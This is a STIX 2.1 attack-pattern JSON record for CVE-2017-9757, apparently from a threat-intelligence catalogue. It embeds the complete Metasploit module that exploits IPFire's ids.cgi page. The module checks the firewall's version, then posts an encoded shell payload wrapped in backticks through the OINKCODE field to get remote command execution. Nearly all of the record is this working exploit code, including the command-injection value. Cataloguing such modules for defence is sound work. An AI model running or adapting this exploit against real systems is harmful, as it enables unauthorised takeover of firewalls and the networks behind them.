{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d094836-7108-483a-aab4-a3ec5b4f6da0",
    "created": "2024-08-14T17:01:22.779002Z",
    "modified": "2024-08-14T17:01:22.779006Z",
    "name": "IPFire proxy.cgi RCE",
    "description": "( IPFire, a free linux based open source firewall distribution version < 2.19 Update Core 110 contains a remote command execution vulnerability in the ids.cgi page in the OINKCODE field. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ipfire_oinkcode_exec.rb",
            "external_id": "ipfire_oinkcode_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9757"
        }
    ],
    "x_code_snippet": "##\n## This module requires Metasploit: https://metasploit.com/download\n## Current source: https://github.com/rapid7/metasploit-framework\n###\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'IPFire proxy.cgi RCE',\n        'Description' => %q(\n          IPFire, a free linux based open source firewall distribution,\n          version < 2.19 Update Core 110 contains a remote command execution\n          vulnerability in the ids.cgi page in the OINKCODE field.\n        ),\n        'Author'      =>\n          [\n            'h00die <mike@stcyrsecurity.com>', # module\n            '0x09AL'                         # discovery\n          ],\n        'References'  =>\n          [\n            [ 'CVE', '2017-9757' ],\n            [ 'EDB', '42149' ]\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => 'unix',\n        'Privileged'     => false,\n        'DefaultOptions' => { 'SSL' => true },\n        'Arch'           => [ ARCH_CMD ],\n        'Payload'        =>\n          {\n            'Compat' =>\n              {\n                'PayloadType' => 'cmd',\n                'RequiredCmd' => 'perl awk openssl'\n              }\n          },\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2017-06-09'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', '']),\n        Opt::RPORT(444)\n      ]\n    )\n  end\n\n  def check\n    begin\n      # authorization header required, see https://github.com/rapid7/metasploit-framework/pull/6433#r56764179\n      # after a chat with @bcoles in IRC.\n      res = send_request_cgi(\n        'uri'           => '/cgi-bin/pakfire.cgi',\n        'method'        => 'GET',\n        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      )\n\n      if res && res.code == 200\n        /\\<strong\\>IPFire (?<version>[\\d.]{4}) \\([\\w]+\\) - Core Update (?<update>[\\d]+)/ =~ res.body\n      end\n      if version.nil? || update.nil? || !Rex::Version.correct?(version)\n        vprint_error('No Recognizable Version Found')\n        CheckCode::Safe\n      elsif Rex::Version.new(version) <= Rex::Version.new('2.19') && update.to_i <= 110\n        CheckCode::Appears\n      else\n        vprint_error('Version and/or Update Not Supported')\n        CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"Connection Failed\")\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    begin\n      # authorization header required, see https://github.com/rapid7/metasploit-framework/pull/6433#r56764179\n      # after a chat with @bcoles in IRC.\n      vprint_status('Sending request')\n      res = send_request_cgi(\n        'uri'           => '/cgi-bin/ids.cgi',\n        'method'        => 'POST',\n        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n        'headers'       =>\n          {\n            'Referer' => \"#{datastore['SSL'] ? 'https' : 'http'}://#{datastore['RHOST']}:#{datastore['RPORT']}/cgi-bin/ids.cgi\"\n          },\n        'vars_post'          => {\n          'ENABLE_SNORT_GREEN' => 'on',\n          'ENABLE_SNORT' => 'on',\n          'RULES' => 'registered',\n          'OINKCODE' => \"`#{payload.encoded}`\",\n          'ACTION' => 'Download new ruleset',\n          'ACTION2' => 'snort'\n          }\n      )\n\n      # success means we hang our session, and wont get back a response, so just check we get a response back\n      if res && res.code != 200\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-06-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}